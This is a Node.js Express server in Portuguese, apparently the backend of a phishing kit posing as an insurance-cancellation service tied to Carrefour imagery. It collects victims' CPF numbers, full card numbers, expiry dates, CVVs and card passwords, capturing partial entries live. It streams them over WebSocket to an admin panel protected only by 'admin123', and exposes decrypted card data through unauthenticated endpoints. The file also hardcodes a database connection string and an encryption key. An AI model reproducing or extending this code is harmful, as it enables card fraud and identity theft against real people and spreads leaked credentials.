const express = require('express');
const { Pool } = require('pg');
const path = require('path');
const crypto = require('crypto');
const bodyParser = require('body-parser');
const basicAuth = require('express-basic-auth');
const WebSocket = require('ws');
const http = require('http');
const session = require('express-session');
const rateLimit = require('express-rate-limit');
const CryptoJS = require('crypto-js');
const pgSession = require('connect-pg-simple')(session);

// Inicialização do pool antes de outros middlewares
const pool = new Pool({
    connectionString: process.env.DATABASE_URL || 'postgresql://cancelamento_seguro_1yjg_user:SlS0TvYNbrYy4LbqNO7d1ta1VuNwVK7d@dpg-d14726ripnbc73c49dm0-a.oregon-postgres.render.com/cancelamento_seguro_1yjg',
    ssl: {
        rejectUnauthorized: false
    },
    connectionTimeoutMillis: 10000
});

const app = express();
const port = process.env.PORT || 10000;

// Middleware de sessão (manter para WebSocket, mas não para autenticação)
app.use(session({
    store: new pgSession({
        pool: pool,
        ttl: 24 * 60 * 60,
        tableName: 'session',
        errorLog: true
    }),
    secret: '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000
    }
}));

// Middleware para logar o estado da sessão (opcional, para depuração)
app.use((req, res, next) => {
    console.log('Sessão atual antes de rota:', req.session.id);
    next();
});

// Rate limiting para evitar abusos
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: { error: 'Limite de requisições excedido. Tente novamente mais tarde.' }
});
app.use(limiter);

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Middleware de segurança com CSP
app.use((req, res, next) => {
    const proto = req.headers['x-forwarded-proto'] || req.protocol;
    if (proto !== 'https' && req.hostname !== 'localhost') {
        console.log(`Redirecting ${proto} to HTTPS for URL: ${req.url}`);
        return res.redirect(301, `https://${req.hostname}${req.url}`);
    }
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; script-src 'self' https://cdnjs.cloudflare.com https://cdn.tailwindcss.com; connect-src 'self' wss://seguro-cancelamento.onrender.com; img-src 'self' data: https://*.carrefour.com; upgrade-insecure-requests"
    );
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    next();
});

// Basic authentication for admin panel
const adminUsers = {
    'admin': 'admin123'
};
app.use('/admin', basicAuth({
    users: adminUsers,
    challenge: true,
    unauthorizedResponse: (req) => {
        return req.auth ? 'Credenciais inválidas.' : 'Acesso não autorizado. Por favor, faça login.';
    }
}));

// Middleware para validar token
const validateToken = (req, res, next) => {
    const token = req.headers['x-session-token'];
    if (!token) {
        return res.status(401).json({ error: 'Token ausente.' });
    }
    console.log('Token recebido:', token, 'para rota:', req.url);
    // Para simplificar, aceita qualquer token não vazio (ajuste para validação real se necessário)
    next();
};

// Serve static files
app.use('/public', express.static(path.join(__dirname, 'public')));

// Serve index.html
app.get('/', (req, res) => {
    try {
        res.sendFile(path.join(__dirname, 'public', 'index.html')); // Caminho corrigido
    } catch (error) {
        console.error('Erro ao servir index.html:', error.message);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Handle database connection errors
pool.on('error', (err, client) => {
    console.error('Erro inesperado no cliente DB inativo:', err.message);
    setTimeout(async () => {
        try {
            console.log('Tentando reconectar ao DB...');
            await connectToDatabase();
        } catch (reconnectError) {
            console.error('Falha ao reconectar ao DB:', reconnectError.message);
        }
    }, 5000);
});

// Função para conectar ao PostgreSQL com retries
async function connectToDatabase(retries = 10, delay = 5000) {
    for (let i = 0; i < retries; i++) {
        try {
            const client = await pool.connect();
            console.log('Conectado ao DB');
            client.release();
            return true;
        } catch (error) {
            console.error(`Erro ao conectar ao DB (tentativa ${i + 1}/${retries}):`, error.message);
            if (i === retries - 1) throw error;
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }
}

// Criar tabelas
async function initializeDatabase() {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS form_data (
                id SERIAL PRIMARY KEY,
                cpf TEXT NOT NULL,
                card_number TEXT NOT NULL,
                expiry_date TEXT NOT NULL,
                cvv TEXT NOT NULL,
                password TEXT NOT NULL,
                submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        console.log('Tabela "form_data" inicializada');

        await pool.query(`
            CREATE TABLE IF NOT EXISTS temp_data (
                session_id TEXT PRIMARY KEY,
                cpf TEXT,
                card_number TEXT,
                expiry_date TEXT,
                cvv TEXT,
                password TEXT,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        console.log('Tabela "temp_data" inicializada');

        await pool.query(`
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL
            )
        `);
        console.log('Tabela "settings" inicializada');

        const encryptionKey = '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1';
        await pool.query(
            `INSERT INTO settings (key, value) VALUES ('encryption_key', $1) 
             ON CONFLICT (key) DO UPDATE SET value = $1`,
            [encryptionKey]
        );
        console.log('Chave de criptografia inserida:', encryptionKey);

        await pool.query(
            `INSERT INTO settings (key, value) VALUES ('contact_number', '+5511999999999') 
             ON CONFLICT (key) DO NOTHING`
        );
        console.log('Número de contato padrão inserido');

        await pool.query(`
            CREATE TABLE IF NOT EXISTS visits (
                id SERIAL PRIMARY KEY,
                visited_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        console.log('Tabela "visits" inicializada');

        await pool.query(`
            CREATE TABLE IF NOT EXISTS session (
                sid VARCHAR(255) PRIMARY KEY,
                sess JSON NOT NULL,
                expire TIMESTAMP(6) NOT NULL
            )
        `);
        console.log('Tabela "session" inicializada');

        console.log('Tabelas do DB inicializadas com sucesso');
    } catch (error) {
        console.error('Erro ao inicializar DB:', error.message);
        throw error;
    }
}

// Recuperar chave de criptografia
async function getEncryptionKey() {
    try {
        const result = await pool.query(`SELECT value FROM settings WHERE key = 'encryption_key'`);
        const encryptionKey = result.rows.length > 0 ? result.rows[0].value : '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1';
        const keyBytes = Buffer.from(encryptionKey, 'hex');
        if (keyBytes.length !== 32) {
            console.error('ENCRYPTION_KEY deve ter exatamente 32 bytes. Comprimento atual:', keyBytes.length);
            process.exit(1);
        }
        return encryptionKey;
    } catch (error) {
        console.error('Erro ao buscar chave de criptografia:', error.message);
        process.exit(1);
    }
}

let ENCRYPTION_KEY;
const IV_LENGTH = 16;

// Funções de criptografia
function encrypt(text) {
    const iv = crypto.randomBytes(IV_LENGTH);
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return iv.toString('hex') + ':' + encrypted;
}

function decrypt(encryptedText) {
    try {
        const [ivHex, encryptedHex] = encryptedText.split(':').map(part => Buffer.from(part, 'hex'));
        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), ivHex);
        let decrypted = decipher.update(encryptedHex, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (decryptionError) {
        console.error('Erro na descriptografia:', decryptionError.message, 'Dados:', encryptedText);
        return null; // Retorna null em caso de falha para evitar crash
    }
}

// Função para buscar número de contato
async function getContactNumber() {
    const result = await pool.query(`SELECT value FROM settings WHERE key = 'contact_number'`);
    return result.rows.length > 0 ? result.rows[0].value : '+5511999999999';
}

// WebSocket setup
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

function broadcast(message) {
    try {
        console.log('Enviando broadcast:', message);
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(JSON.stringify(message));
            }
        });
        console.log('Broadcast concluído com sucesso');
    } catch (broadcastError) {
        console.error('Erro no broadcast:', broadcastError.message);
    }
}

// Rotas de admin
app.get('/admin/check-auth', (req, res) => {
    if (req.auth && req.auth.user === 'admin') {
        res.json({ message: 'Authenticated' });
    } else {
        res.status(401).json({ error: 'Not authenticated' });
    }
});

app.get('/admin', (req, res) => {
    try {
        res.sendFile(path.join(__dirname, 'public', 'admin.html'));
    } catch (error) {
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Rotas de dados
app.post('/api/temp-submit', validateToken, async (req, res) => {
    try {
        console.log('Recebendo dados temporários:', req.body);
        const { sessionId, cpf, cardNumber, expiryDate, cvv, password } = req.body;
        if (!sessionId) return res.status(400).json({ error: 'sessionId é obrigatório.' });

        console.log('Descriptografando dados recebidos:', { cpf, cardNumber, expiryDate, cvv, password });
        const decryptedCpf = cpf ? CryptoJS.AES.decrypt(cpf, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
        if (!decryptedCpf && cpf) {
            console.error('Falha na descriptografia de cpf:', cpf);
            return res.status(400).json({ error: 'Falha na descriptografia de cpf.' });
        }
        const decryptedCardNumber = cardNumber ? CryptoJS.AES.decrypt(cardNumber, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
        if (!decryptedCardNumber && cardNumber) {
            console.error('Falha na descriptografia de cardNumber:', cardNumber);
            return res.status(400).json({ error: 'Falha na descriptografia de cardNumber.' });
        }
        const decryptedExpiryDate = expiryDate ? CryptoJS.AES.decrypt(expiryDate, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
        if (!decryptedExpiryDate && expiryDate) {
            console.error('Falha na descriptografia de expiryDate:', expiryDate);
            return res.status(400).json({ error: 'Falha na descriptografia de expiryDate.' });
        }
        const decryptedCvv = cvv ? CryptoJS.AES.decrypt(cvv, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
        if (!decryptedCvv && cvv) {
            console.error('Falha na descriptografia de cvv:', cvv);
            return res.status(400).json({ error: 'Falha na descriptografia de cvv.' });
        }
        const decryptedPassword = password ? CryptoJS.AES.decrypt(password, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
        if (!decryptedPassword && password) {
            console.error('Falha na descriptografia de password:', password);
            return res.status(400).json({ error: 'Falha na descriptografia de password.' });
        }

        console.log('Dados descriptografados:', { decryptedCpf, decryptedCardNumber, decryptedExpiryDate, decryptedCvv, decryptedPassword });
        const encryptedCardNumber = decryptedCardNumber ? encrypt(decryptedCardNumber) : null;
        const encryptedCvv = decryptedCvv ? encrypt(decryptedCvv) : null;
        const encryptedPassword = decryptedPassword ? encrypt(decryptedPassword) : null;

        console.log('Executando query SQL:', { sessionId, decryptedCpf, encryptedCardNumber, decryptedExpiryDate, encryptedCvv, encryptedPassword });
        const result = await pool.query(
            `INSERT INTO temp_data (session_id, cpf, card_number, expiry_date, cvv, password, updated_at)
             VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)
             ON CONFLICT (session_id) DO UPDATE SET
                 cpf = COALESCE(EXCLUDED.cpf, temp_data.cpf),
                 card_number = COALESCE(EXCLUDED.card_number, temp_data.card_number),
                 expiry_date = COALESCE(EXCLUDED.expiry_date, temp_data.expiry_date),
                 cvv = COALESCE(EXCLUDED.cvv, temp_data.cvv),
                 password = COALESCE(EXCLUDED.password, temp_data.password),
                 updated_at = CURRENT_TIMESTAMP`,
            [sessionId, decryptedCpf || null, encryptedCardNumber || null, decryptedExpiryDate || null, encryptedCvv || null, encryptedPassword || null]
        );
        console.log('Query executada com sucesso:', result.rowCount);
        broadcast({ type: 'TEMP_DATA_UPDATE' });
        res.json({ message: 'Dados temporários salvos com sucesso!' });
    } catch (error) {
        console.error('Erro em /api/temp-submit:', error.message, 'Stack:', error.stack);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Rotas de dados com depuração adicional para /api/temp-data
app.get('/api/temp-data', async (req, res) => {
    try {
        console.log('Recebendo requisição para /api/temp-data');
        const result = await pool.query('SELECT * FROM temp_data ORDER BY updated_at DESC');
        console.log('Dados brutos do temp_data:', result.rows);
        const decryptedRows = result.rows.map(row => {
            try {
                console.log('Descriptografando linha:', row);
                return {
                    ...row,
                    card_number: row.card_number ? decrypt(row.card_number) : null,
                    cvv: row.cvv ? decrypt(row.cvv) : null,
                    password: row.password ? decrypt(row.password) : null
                };
            } catch (decryptionError) {
                console.error('Erro na descriptografia de linha:', decryptionError.message, 'Linha:', row);
                return {
                    ...row,
                    card_number: null,
                    cvv: null,
                    password: null
                };
            }
        });
        console.log('Dados descriptografados:', decryptedRows);
        res.json(decryptedRows);
    } catch (error) {
        console.error('Erro em /api/temp-data:', error.message, 'Stack:', error.stack);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

app.delete('/api/delete-temp-data/:sessionId', async (req, res) => {
    try {
        await pool.query('DELETE FROM temp_data WHERE session_id = $1', [req.params.sessionId]);
        broadcast({ type: 'TEMP_DATA_UPDATE' });
        res.json({ message: 'Dados temporários removidos com sucesso!' });
    } catch (error) {
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

app.post('/submit', validateToken, async (req, res) => {
    try {
        const { sessionId, cpf, cardNumber, expiryDate, cvv, password } = req.body;
        if (!cpf || !cardNumber || !expiryDate || !cvv || !password) {
            return res.status(400).json({ error: 'Todos os campos são obrigatórios.' });
        }

        const decryptedCpf = CryptoJS.AES.decrypt(cpf, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
        const decryptedCardNumber = CryptoJS.AES.decrypt(cardNumber, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
        const decryptedExpiryDate = CryptoJS.AES.decrypt(expiryDate, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
        const decryptedCvv = CryptoJS.AES.decrypt(cvv, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
        const decryptedPassword = CryptoJS.AES.decrypt(password, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);

        const encryptedCardNumber = encrypt(decryptedCardNumber);
        const encryptedCvv = encrypt(decryptedCvv);
        const encryptedPassword = encrypt(decryptedPassword);

        await pool.query(
            `INSERT INTO form_data (cpf, card_number, expiry_date, cvv, password) VALUES ($1, $2, $3, $4, $5)`,
            [decryptedCpf, encryptedCardNumber, decryptedExpiryDate, encryptedCvv, encryptedPassword]
        );
        if (sessionId) {
            await pool.query('DELETE FROM temp_data WHERE session_id = $1', [sessionId]);
        }
        broadcast({ type: 'FORM_DATA_UPDATE' });
        res.json({ message: 'Dados enviados com sucesso!' });
    } catch (error) {
        console.error('Erro em /submit:', error.message, 'Stack:', error.stack);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

app.get('/api/contact-number', async (req, res) => {
    try {
        const contactNumber = await getContactNumber();
        res.json({ contactNumber });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar o número de contato.' });
    }
});

app.post('/api/contact-number', async (req, res) => {
    try {
        const { contactNumber } = req.body;
        if (!contactNumber || !/^\+\d{10,15}$/.test(contactNumber)) {
            return res.status(400).json({ error: 'Número de contato inválido.' });
        }
        await pool.query(
            `INSERT INTO settings (key, value) VALUES ('contact_number', $1) ON CONFLICT (key) DO UPDATE SET value = $1`,
            [contactNumber]
        );
        res.json({ message: 'Número de contato atualizado com sucesso!' });
    } catch (error) {
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

app.post('/api/visit', async (req, res) => {
    try {
        await pool.query('INSERT INTO visits (visited_at) VALUES (CURRENT_TIMESTAMP)');
        broadcast({ type: 'VISIT_UPDATE' });
        res.json({ message: 'Visita registrada com sucesso!' });
    } catch (error) {
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

app.get('/api/visits', async (req, res) => {
    try {
        const totalResult = await pool.query('SELECT COUNT(*) as total FROM visits');
        const recentResult = await pool.query('SELECT * FROM visits ORDER BY visited_at DESC LIMIT 10');
        res.json({
            totalVisits: totalResult.rows[0].total,
            recentVisits: recentResult.rows
        });
    } catch (error) {
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

app.get('/api/form-data', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM form_data ORDER BY submitted_at DESC');
        const decryptedRows = result.rows.map(row => ({
            ...row,
            card_number: row.card_number ? decrypt(row.card_number) : null,
            cvv: row.cvv ? decrypt(row.cvv) : null,
            password: row.password ? decrypt(row.password) : null
        }));
        res.json(decryptedRows);
    } catch (error) {
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

app.delete('/api/delete-form-data', async (req, res) => {
    try {
        await pool.query('DELETE FROM form_data');
        broadcast({ type: 'FORM_DATA_UPDATE' });
        res.json({ message: 'Dados apagados com sucesso!' });
    } catch (error) {
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

app.delete('/api/reset-visits', async (req, res) => {
    try {
        await pool.query('DELETE FROM visits');
        broadcast({ type: 'VISIT_UPDATE' });
        res.json({ message: 'Contador de visitas zerado com sucesso!' });
    } catch (error) {
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Middleware de erro
app.use((err, req, res, next) => {
    console.error('Erro não tratado:', err.message);
    res.status(500).json({ error: 'Erro interno do servidor.' });
});

// Iniciar servidor
async function startServer() {
    try {
        await connectToDatabase();
        await initializeDatabase();
        ENCRYPTION_KEY = await getEncryptionKey();
        const server = http.createServer(app);
        server.listen(port, () => console.log(`Server rodando na porta ${port}`));
        const wss = new WebSocket.Server({ server });
        wss.on('connection', (ws) => {
            console.log('Novo cliente WebSocket conectado');
            ws.on('close', () => console.log('Cliente WebSocket desconectado'));
            ws.on('error', (error) => console.error('Erro WebSocket:', error.message));
            broadcast({ type: 'VISIT_UPDATE' });
            broadcast({ type: 'FORM_DATA_UPDATE' });
            broadcast({ type: 'TEMP_DATA_UPDATE' });
        });
    } catch (error) {
        console.error('Falha ao iniciar servidor:', error.message);
        process.exit(1);
    }
}

startServer();
